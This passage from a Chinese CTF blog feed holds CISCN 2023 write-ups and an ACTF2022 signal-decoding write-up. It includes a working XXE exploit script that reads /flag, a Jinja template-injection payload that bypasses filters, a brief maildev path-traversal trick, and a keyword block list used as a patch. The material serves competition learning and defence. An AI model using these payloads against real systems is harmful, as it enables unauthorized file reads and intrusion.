&amp;amp;&amp;amp;th:ths) th.&lt;span class=&#34;built_in&#34;&gt;join&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;0day&#34;&gt;&lt;a href=&#34;#0day&#34; class=&#34;headerlink&#34; title=&#34;0day&#34;&gt;&lt;/a&gt;0day&lt;/h2&gt;&lt;p&gt;利用路径穿越写maildev的lib&amp;#x2F;router.js增加自定义路由。&lt;br&gt;调用：把服务打挂（例如试图写&amp;#x2F;flag），重启的时候就会加载。  &lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/</guid>
            <title>CISCN 2023 Write-Up &amp; Tricks</title>
            <link>http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/</link>
            <category>Write-Up</category>
            <category>CISCN</category>
            <category>web</category>
            <pubDate>Fri, 07 Jul 2023 00:28:12 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;CISCN-2023-部分-Write-Up-及patch妙妙小技巧&#34;&gt;&lt;a href=&#34;#CISCN-2023-部分-Write-Up-及patch妙妙小技巧&#34; class=&#34;headerlink&#34; title=&#34;CISCN 2023 部分 Write-Up 及patch妙妙小技巧&#34;&gt;&lt;/a&gt;CISCN 2023 部分 Write-Up 及patch妙妙小技巧&lt;/h1&gt;&lt;h2 id=&#34;Web&#34;&gt;&lt;a href=&#34;#Web&#34; class=&#34;headerlink&#34; title=&#34;Web&#34;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&#34;ezphp&#34;&gt;&lt;a href=&#34;#ezphp&#34; class=&#34;headerlink&#34; title=&#34;ezphp&#34;&gt;&lt;/a&gt;ezphp&lt;/h3&gt;&lt;p&gt;变量覆盖+XXE外部实体注入任意文件读。&lt;br&gt;Patch：修了extract就行&lt;br&gt;exp:  &lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file = &lt;span class=&#34;string&#34;&gt;&amp;quot;/flag&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;username = &lt;span class=&#34;string&#34;&gt;&amp;quot;okok20&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;&lt;span class=&#34;subst&#34;&gt;&amp;#123;username&amp;#125;&lt;/span&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;y&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;user_xml_format&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE ANY [&amp;lt;!ENTITY content SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=&lt;span class=&#34;subst&#34;&gt;&amp;#123;file&amp;#125;&lt;/span&gt;&amp;quot;&amp;gt;]&amp;gt;&amp;lt;userinfo&amp;gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;content;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;1&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;&amp;lt;/userinfo&amp;gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://175.20.20.196/register.php&amp;quot;&lt;/span&gt;,data=data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.get(&lt;span class=&#34;string&#34;&gt;f&amp;quot;http://175.20.20.196/login.php?username=&lt;span class=&#34;subst&#34;&gt;&amp;#123;username&amp;#125;&lt;/span&gt;&amp;amp;password=2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;Ciscn-Search-Engine&#34;&gt;&lt;a href=&#34;#Ciscn-Search-Engine&#34; class=&#34;headerlink&#34; title=&#34;Ciscn_Search_Engine&#34;&gt;&lt;/a&gt;Ciscn_Search_Engine&lt;/h3&gt;&lt;p&gt;Jinja模板注入，绕过滤字符。我们可以使用request调用get参数来绕过各种字符。   &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(request.values.name6)|attr(request.values.name5)()&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;post:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name1=__class__&amp;amp;name2=__base__&amp;amp;name3=__subclasses__&amp;amp;name4=pop&amp;amp;name5=read&amp;amp;name6=&amp;quot;/flag&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Patch：把花括号干了。  &lt;/p&gt;
&lt;h3 id=&#34;其他七七八八的Patch&#34;&gt;&lt;a href=&#34;#其他七七八八的Patch&#34; class=&#34;headerlink&#34; title=&#34;其他七七八八的Patch&#34;&gt;&lt;/a&gt;其他七七八八的Patch&lt;/h3&gt;&lt;p&gt;首先，我们是可以知道Patch失败的原因的，那么一定要确保不要Patch过猛导致服务异常；我们需要&lt;strong&gt;优先确保服务正常工作，逐步加大Patch力度&lt;/strong&gt;。&lt;/p&gt;
&lt;h4 id=&#34;过滤关键字&#34;&gt;&lt;a href=&#34;#过滤关键字&#34; class=&#34;headerlink&#34; title=&#34;过滤关键字&#34;&gt;&lt;/a&gt;过滤关键字&lt;/h4&gt;&lt;p&gt;无脑过滤可以迅速打上Patch！我们可以尽量构造一些正常流量中不太可能出现的字符组合来避免被判服务down掉。&lt;br&gt;比如说，想要过滤Python模板注入，我们可以过滤如下组合：&lt;br&gt;&lt;code&gt;|_&lt;/code&gt;, &lt;code&gt;._&lt;/code&gt;, &lt;code&gt;_c&lt;/code&gt;, &lt;code&gt;_[&lt;/code&gt;, &lt;code&gt;](&lt;/code&gt;&lt;br&gt;而对于SQL注入就更简单了：自己打一打，看看哪些函数、符号能利用，就直接过滤掉。  &lt;/p&gt;
&lt;h4 id=&#34;类型安全&#34;&gt;&lt;a href=&#34;#类型安全&#34; class=&#34;headerlink&#34; title=&#34;类型安全&#34;&gt;&lt;/a&gt;类型安全&lt;/h4&gt;&lt;p&gt;如果涉及弱类型的语言，比如PHP，经常会有洞出在弱比较上，那么我们可以考虑如下几种手段：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用强比较：例如PHP&amp;#x2F;Js中使用&lt;code&gt;===&lt;/code&gt;而非&lt;code&gt;==&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;在关键参数入口处进行正则化：例如，对于期望是整数的参数&lt;code&gt;iv&lt;/code&gt;，就应强制让&lt;code&gt;iv=intval(iv)&lt;/code&gt;转为整型；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;相信也可以发现国赛这种patch难度远低于attack的难度。建议&lt;strong&gt;做题的初期当作没有攻击得分，先patch了再说&lt;/strong&gt;。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/</guid>
            <title>ACTF2022 - FFSK - Official WriteUp</title>
            <link>http://cubicy.icu/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/</link>
            <category>Misc</category>
            <category>Write-Up</category>
            <category>出题</category>
            <pubDate>Sun, 03 Jul 2022 23:43:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;FFSK-WriteUp&#34;&gt;&lt;a href=&#34;#FFSK-WriteUp&#34; class=&#34;headerlink&#34; title=&#34;FFSK - WriteUp&#34;&gt;&lt;/a&gt;FFSK - WriteUp&lt;/h1&gt;&lt;p&gt;&lt;del&gt;众所周知歪歪歪英文很烂求轻喷&lt;/del&gt;  &lt;/p&gt;
&lt;h3 id=&#34;0-Intro&#34;&gt;&lt;a href=&#34;#0-Intro&#34; class=&#34;headerlink&#34; title=&#34;0. Intro&#34;&gt;&lt;/a&gt;0. Intro&lt;/h3&gt;&lt;p&gt;In the game period, only one team had solved this problem: MapleBacon, a genius team at the University of British Columbia. I’m happy about their praise, but after checking their solution I think what truly “impressive” is their creativity and persistence.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Strongly recommend reading their awesome solution: &lt;a href=&#34;https://maplebacon.org/2022/06/actf-ffsk/&#34;&gt;https://maplebacon.org/2022/06/actf-ffsk/&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;FSK &amp;#x3D; Frequency-shift keying.&lt;/p&gt;
&lt;p&gt;FFSK &amp;#x3D; Double FSK or Fast FSK, whatever.&lt;/p&gt;
&lt;p&gt;This problem is designed to invite participants to have a look at &lt;em&gt;the principle of communication&lt;/em&gt;. &lt;/p&gt;
&lt;h3 id=&#34;1-Description&#34;&gt;&lt;a href=&#34;#1-Description&#34; class=&#34;headerlink&#34; title=&#34;1. Description&#34;&gt;&lt;/a&gt;1. Description&lt;/h3&gt;&lt;p&gt;A journey to solve a misc problem always begins from a problem description. Here’s it:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I’ve bought the &lt;strong&gt;second commercial modem&lt;/strong&gt; for computers in a big city of the UK.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;激情澎湃的球迷迷恋这个地方。遇上球赛季，酒吧里的热情、呐喊、啤酒、摇滚，足球让这个城市充满活力和希望。&lt;br&gt;从三万英尺的云端望去，往日的生活成了一个遥远微小的地图。&lt;br&gt;阳光明媚的日子，开始出发，北京时间00:50 开始起飞，一个梦的距离，就可以到达荷兰阿姆斯特丹，短暂停留之后，然后转机飞往英国&lt;br&gt;南航的飞机配置完备，全程可以充电，还有wifi，影视屏有面前最新的电影。睡睡醒醒，在飞机上觅到一部《北京爱情故事》，让我在三万英尺的空中哭的稀里哗啦。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;Just Google it, and you’ll realize what it means:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;second commercial modem→Bell 103, corresponds with the file name “modem.wav”&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;a big city in the UK: &lt;strong&gt;Manchester&lt;/strong&gt;, which refers to the famous coding method.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The source of the long Chinese paragraph: &lt;a href=&#34;https://kknews.cc/zh-hk/travel/e6yjp34.html&#34;&gt;https://kknews.cc/zh-hk/travel/e6yjp34.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;  It describes a trip to Manchester, which is indeed a big city in the UK.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-Bell-103&#34;&gt;&lt;a href=&#34;#2-Bell-103&#34; class=&#34;headerlink&#34; title=&#34;2. Bell 103&#34;&gt;&lt;/a&gt;2. Bell 103&lt;/h3&gt;&lt;p&gt;Here’s an article that shows how the Bell 103 protocol works: &lt;a href=&#34;https://vigrey.com/blog/emulating-bell-103-modem&#34;&gt;https://vigrey.com/blog/emulating-bell-103-modem&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So two key points need your attention. First, characters are stored in ASCII code and are &lt;strong&gt;little-endian;&lt;/strong&gt; second, it has 2 channels for communication: one for the server-side(2025&amp;#x2F;2225 Hz), and another for the client-side(1070&amp;#x2F;1270 Hz).&lt;/p&gt;
&lt;p&gt;You can also find it from the spectrogram of the .wav file.&lt;/p&gt;
&lt;h3 id=&#34;2-Server-channel&#34;&gt;&lt;a href=&#34;#2-Server-channel&#34; class=&#34;headerlink&#34; title=&#34;2. Server channel&#34;&gt;&lt;/a&gt;2. Server channel&lt;/h3&gt;&lt;p&gt;Using the &lt;code&gt;minimodem&lt;/code&gt;tool (See MapleBacon’s write-up) is functional.&lt;/p&gt;
&lt;p&gt;Also, you can find some useful tools in GitHub: &lt;a href=&#34;https://github.com/laurenschneider/audiodecoder&#34;&gt;https://github.com/laurenschneider/audiodecoder&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It may be a faster way. In fact, the &lt;code&gt;solve.py&lt;/code&gt; is based on its code.&lt;/p&gt;
&lt;p&gt;After all, you’ll see this on the server channel:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HINT_Hamming@ddddPdddddddPdddPdPP(20).ECCode; Content: Why do you use such&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a slow method with a high Bit Error Ratio for communication? It took me a lot of&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;effort to correct bit-flips, making sure the communication was less&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error-prone...that is 2 say, THE ORIGINAL PROTOCOL IS WRAPPED BY SOME OTHER&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;TRANSFORMATIONS! Fortunately, we can now communicate properly on another channel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;while enjoying a vacation in this BIG CITY--I mean, IEEE 802.3.....Wait, what is&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the new protocol? Guess by yourself!&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-Client-channel&#34;&gt;&lt;a href=&#34;#3-Client-channel&#34; class=&#34;headerlink&#34; title=&#34;3. Client channel&#34;&gt;&lt;/a&gt;3. Client channel&lt;/h3&gt;&lt;p&gt;We can extract the bit string on this channel using the same method but just make some tweaks of frequency. You’ll get a bit string of 53640 bits.&lt;/p&gt;
&lt;p&gt;Notice that the bit string contains only “01” “10”, that is what &lt;strong&gt;Manchester is&lt;/strong&gt; all about. The &lt;code&gt;IEEE 802.3&lt;/code&gt;mentioned in the server channel message is actually to make sure you decode in the right way: there are 2 opposite ways to map 01&amp;#x2F;10 to 1&amp;#x2F;0, but what is widely used is defined in IEEE 802.3, which says “01”→1 and “10”→0&lt;/p&gt;
&lt;p&gt;Then the key problem is to solve Hamming code. From the given information, you’ll realize the block size is 20bits. Implement it by yourself or just Google&amp;#x2F;GitHub&amp;#x2F;StackOverflow it.&lt;/p&gt;
&lt;p&gt;Find every “1” bit in a block, XOR their &lt;strong&gt;positions&lt;/strong&gt;, and magically you got the error bit position(0 if no error) which is a well-designed feature of Hamming code, then just flip the bit. &lt;/p&gt;
&lt;p&gt;Actually, every block has, and only has an error bit: that’s an intended design to notify you that you’re on the right way :)&lt;/p&gt;
&lt;h3 id=&#34;4-Final-Step&#34;&gt;&lt;a href=&#34;#4-Final-Step&#34; class=&#34;headerlink&#34; title=&#34;4. Final Step&#34;&gt;&lt;/a&gt;4. Final Step&lt;/h3&gt;&lt;p&gt;Now you’ve got the cipher bit string: just applied Bell 103 decoder to it once again. &lt;/p&gt;
&lt;p&gt;It’ll yield a string that starts with &lt;code&gt;data:image/png;base64,&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;An experienced CTFer will immediately put it into the browser (like what MapleBacon did). Or you can find a random online converter to recover this Base64-encoded image. It’s a QR Code. Scan it, and got the flag.&lt;/p&gt;
&lt;h3 id=&#34;5-Hints-Explanation&#34;&gt;&lt;a href=&#34;#5-Hints-Explanation&#34; class=&#34;headerlink&#34; title=&#34;5. Hints Explanation&#34;&gt;&lt;/a&gt;5. Hints Explanation&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;所有人都认为，吃鸡蛋前，原始的方法是打破鸡蛋较大的一端。可是当今皇帝的祖父 时候吃鸡蛋，一次按古法打鸡蛋时碰巧将一个手指弄破了，因此他的父亲，当时的皇帝， 就下了一道敕令，命令全体臣民吃鸡蛋时打破鸡蛋较小的一端，违令者重罚。 老百姓们 对这项命令极为反感。历史告诉我们，由此曾发生过六次叛乱，其中一个皇帝送了命，另 一个丢了王位…关于这一争端，曾出版过几百本大部著作，不过大端派的书一直是受禁的 ，法律也规定该派的任何人不得做官。 ——乔纳森·斯威夫特，《格列佛游记》&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; It is a quote from Gulliver’s Travels.  Fun fact: this paragraph is &lt;strong&gt;exactly the original source of the 2 words used in modern computer science: “big-endian” &amp;amp; “little-endian”.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; This hint is intended to guide those who are stuck because of their ignorance of the contents(especially the coding method) of the Bell 103 protocol.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Hamming code block size: 20bits&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; Noticed that minimodem may yield partly corrupt text and mislead participants. This hint is to make sure they see the hint hidden at the beginning of the service-side channel message.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Bell 103&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; For those who ignored the problem description.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;6-Script-to-Solve&#34;&gt;&lt;a href=&#34;#6-Script-to-Solve&#34; class=&#34;headerlink&#34; title=&#34;6. Script to Solve&#34;&gt;&lt;/a&gt;6. Script to Solve&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# goertzel.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Module to create a Goertzel filter&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Original source: https://github.com/laurenschneider/audiodecoder&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; numpy &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; np&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Goertzel&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, rate, freq&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.normalize = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.coeffs = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.sample_rate = rate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.target_freq = freq&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;calculate_coeff&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        Precompute coefficients needed for filter equation.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        Coeff formulas courtesy of Prof. Massey&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n = &lt;span class=&#34;number&#34;&gt;160&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        w0 = (&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * np.pi * self.target_freq) / self.sample_rate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.normalize = np.exp(&lt;span class=&#34;number&#34;&gt;1j&lt;/span&gt; * w0 * n)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.coeffs = np.array([np.exp((-&lt;span class=&#34;number&#34;&gt;1j&lt;/span&gt;) * w0 * k) &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; k &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(n)])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;filter&lt;/span&gt;(&lt;span 